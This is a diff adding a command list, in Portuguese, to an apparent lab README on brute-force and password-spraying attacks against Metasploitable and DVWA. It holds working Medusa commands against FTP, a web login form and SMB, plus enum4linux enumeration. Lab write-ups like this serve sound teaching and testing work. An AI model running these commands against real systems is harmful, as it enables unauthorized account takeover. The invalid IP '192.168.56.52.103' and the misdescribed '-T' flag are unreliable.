@@ -41,6 +41,23 @@ Os experimentos serão realizados em máquina virtual vulneráve (Metasploitable
 - Executar ataques simulados: força bruta em FTP, automação de tentativas em formulário web (DVWA) e password spraying em SMB com enumeração de usuários.
 - Documentar os testes: wordlists simples, comandos utilizados, validação de acessos e recomendações de mitigação.
 
+### Comandos Utilizados
+
+### 1. Criação de Wordlists
+* `echo -e "user\nmsfadmin\nadmin\nroot" > users.txt`: Cria a lista de usuários fictícios separados por quebra de linha.
+* `echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt`: Cria a lista de senhas para o ataque de força bruta.
+
+### 2. Força Bruta e Ataque de Dicionário (Medusa)
+* `medusa -h 192.168.56.103 -U users.txt -P pass.txt -M ftp -t 6`: Realiza um ataque de força bruta contra o serviço FTP do IP alvo, testando as combinações das wordlists.
+* `medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http -m PAGE:"/dvwa/login.php" -m FORM:"username=^USER^&password=^PASS^&Login=Login" -m 'FAIL=Login failed' -t 6`: Executa ataque de força bruta no formulário de login HTTP da aplicação web (DVWA).
+
+### 3. Conexão SSH / FTP
+* `ftp 192.168.56.103`: Estabelece conexão interativa com o servidor FTP para validação das credenciais encontradas.
+
+### 4. Enumeração de Sistema e Rede (SMB / Samba)
+* `enum4linux -a 192.168.56.52.103 | tee enum4_output.txt`: Executa a enumeração completa de informações (usuários, compartilhamentos, políticas) em alvos Windows/Samba e salva a saída em arquivo.
+* `medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50`: Executa o ataque de força bruta especificamente contra o protocolo SMB (`smbnt`), definindo 2 threads (`-t 2`) e o limite de 50 tentativas por segundo/conexão (`-T 50`).
+  
 ## 6. Medidas de mitigação
 
 - Implementação de autenticação multifator (MFA).
